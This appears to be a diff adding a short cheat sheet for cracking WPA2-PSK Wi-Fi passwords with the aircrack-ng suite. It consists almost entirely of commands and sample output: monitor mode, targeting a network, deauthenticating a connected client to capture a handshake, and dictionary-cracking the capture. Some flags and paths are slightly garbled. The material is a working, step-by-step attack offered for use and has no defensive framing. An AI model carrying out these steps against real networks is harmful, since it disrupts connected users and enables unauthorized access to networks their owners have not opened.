@@ -1,0 +1,40 @@
+Cheatsheet : Cracking WPA2 PSK 
+First, put the card in monitor mode :
+root@bt:~# airmon-zc 
+
+
+root@bt:~# airmon-zc start wlan0
+
+Let’s find a wireless network that uses WPA2 / PSK :
+root@bt:~# airodump-ng wlan0mon –essid-regex BSIDESDC*
+
+ 
+Stop airodump-ng and run it again, writing all packets to disk :
+airodump-ng wlan0mon --channel 10 --bssid 00:19:5B:52:AD:F7 -w /tmp/wpa2
+
+
+DEAUTH
+We need the bssid of the AP (-a) and the mac of a connected client (-c)
+				         Access Point		Client			
+aireplay-ng -0 1 -a 00:19:5B:52:AD:F7 -c 00:1C:BF:90:5B:A3 wlan0mon
+
+mdk3 wlan0mon d –c 11
+
+As a result, airodump-ng should indicate “WPA Handshake:” in the upper right corner
+ CH 10 ][ Elapsed: 2 mins ][ 2009-02-21 13:04 ][ WPA handshake: 00:19:5B:52:AD:F7                                         
+                                                                                                                                   
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                
+                                                                                                                                   
+ 00:19:5B:52:AD:F7  -33 100     1338       99    0  10  54   WPA2 CCMP   PSK  TestNet                                              
+                                                                                                                                   
+ BSSID              STATION            PWR   Rate   Lost  Packets  Probe                                                           
+                                                                                                                                   
+ 00:19:5B:52:AD:F7  00:1C:BF:90:5B:A3  -27  54-54      0      230 
+Stop airodump-ng and make sure the files were created properly
+root@bt:/# ls /tmp/wpa2* -al
+-rw-r--r-- 1 root root 35189 2009-02-21 13:04 /tmp/wpa2-01.cap
+-rw-r--r-- 1 root root   476 2009-02-21 13:04 /tmp/wpa2-01.csv
+-rw-r--r-- 1 root root   590 2009-02-21 13:04 /tmp/wpa2-01.kismet.csv
+
+aircrack-ng –w /usr/share/dict/craclib-small -b 00:19:5B:52:AD:F7 /tmp/wpa2*.cap
+
